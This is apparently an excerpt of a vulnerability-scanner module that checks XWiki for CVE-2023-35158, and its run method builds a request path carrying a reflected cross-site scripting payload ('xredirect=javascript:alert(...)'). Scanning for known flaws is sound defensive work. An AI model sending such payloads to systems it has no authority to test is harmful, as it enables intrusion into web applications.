...
class Module(Scanner, Http_client):
    __info__ = {
        ...
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2023-35158'],
        'cve': 'CVE-2023-35158',
    }

    def run(self):
        path = '/xwiki/bin/view/XWiki/Main?xpage=restore&showBatch=true&xredirect=javascript:alert(document.domain)'
